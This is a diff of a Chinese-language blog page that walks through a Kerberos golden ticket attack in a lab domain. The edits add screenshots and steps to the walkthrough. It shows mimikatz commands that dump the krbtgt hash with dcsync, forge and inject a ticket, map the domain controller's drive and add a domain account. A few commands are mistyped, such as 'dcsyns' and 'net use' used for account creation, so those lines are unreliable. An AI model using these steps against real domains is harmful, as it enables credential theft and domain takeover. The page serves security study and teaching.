@@ -2143,7 +2143,7 @@
 <td align="center">2012</td>
 </tr>
 </tbody></table>
-<h1 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h1><h1 id="票据生成步骤："><a href="#票据生成步骤：" class="headerlink" title="票据生成步骤："></a>票据生成步骤：</h1><ol>
+<h1 id="票据生成步骤："><a href="#票据生成步骤：" class="headerlink" title="票据生成步骤："></a>票据生成步骤：</h1><ol>
 <li><p><strong>域名</strong></p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li>
 <li><p><strong>域的SID值</strong>     </p>
@@ -2157,9 +2157,10 @@
 <li><p><strong>域的KRBTGT账户NTLM-HASH</strong></p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure></li>
 <li><p><strong>伪造任意域管账号</strong></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user test swanq000!<span class="selector-tag">@</span><span class="comment"># /add /domain</span></span><br></pre></td></tr></table></figure></li>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user test password /add /domain</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h1 id="0x01-获取域SID及krbtgt的HTLM-hash"><a href="#0x01-获取域SID及krbtgt的HTLM-hash" class="headerlink" title="0x01.获取域SID及krbtgt的HTLM-hash"></a>0x01.获取域SID及krbtgt的HTLM-hash</h1><p>先在DC上新建一个实验用户swanq,此攻击都是基于在域控机子上的普通域内账户.即普通域内账户没有创建域管账户的权限或提升普通用户权限，而利用黄金票据可以做到</p>
+<p>获取SID</p>
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/1.jpg"></p>
 <p>mimikatz获取域控SID及krbtgt的NTLMhash.可在域控或在登陆过域控账户的域成员上获取</p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>
@@ -2176,20 +2177,35 @@
 </li>
 </ul>
 </blockquote>
-<h1 id="0x02-伪造票据"><a href="#0x02-伪造票据" class="headerlink" title="0x02.伪造票据"></a>0x02.伪造票据</h1><p>在非域控的机子上，需要先清除本地票据缓存，但因此swanq用户刚创建且并未有其他服务需要票据，所以此处为空，不需要kerberos::purge   </p>
+<h1 id="0x02-伪造票据"><a href="#0x02-伪造票据" class="headerlink" title="0x02.伪造票据"></a>0x02.伪造票据</h1><p>在非域控的机子上，需要先清除本地票据缓存，但因此swanq用户刚创建且并未有其他服务需要票据，所以此处为空，不需要</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/12.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::purge   </span><br></pre></td></tr></table></figure>
+
 <p>得到krbtgt hash后，用mimikatz的Kerberos::golden功能生成金票ticket.kiribi伪造TGT</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">kerberos::golden /user:test /domain:wlaq.com /sid:&#123;s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxx</span>&#125;  /krbtgt:&#123;ntlm<span class="literal">-hash</span>&#125; /ticket:ticket.kiribi</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">kerberos::golden /user:swanq /domain:wlaq.com /sid:&#123;s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxx</span>&#125;  /krbtgt:&#123;ntlm<span class="literal">-hash</span>&#125; /ticket:ticket.kiribi</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/4.png"></p>
 <h1 id="0x03-票据利用"><a href="#0x03-票据利用" class="headerlink" title="0x03.票据利用"></a>0x03.票据利用</h1><p>查看本地保存的票据,确认无误</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/8.png"></p>
+<p>或者klist也可</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/13.png"></p>
 <p>将伪造的黄金票据导入内存</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Kerberos::ptt ticket.kiribi</span><br></pre></td></tr></table></figure>
 
-<p>新建域管账户</p>
+<p>此时可以直接将DC的C盘映射到本地h盘，进行访问，访问有两种方式：</p>
+<p>其一</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/14.png"></p>
+<p>其二</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/15.png"></p>
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/9.png"></p>
+<p>入DC检查</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/16.png"></p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/17.png"></p>
+<p>除了映射之外也可直接添加域管账户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use username password &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>
+
 <p>入DC检查</p>
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/10.png"></p>
 <p>不过此域管账户并没有本地登录权限，还是需要加入administrator组</p>
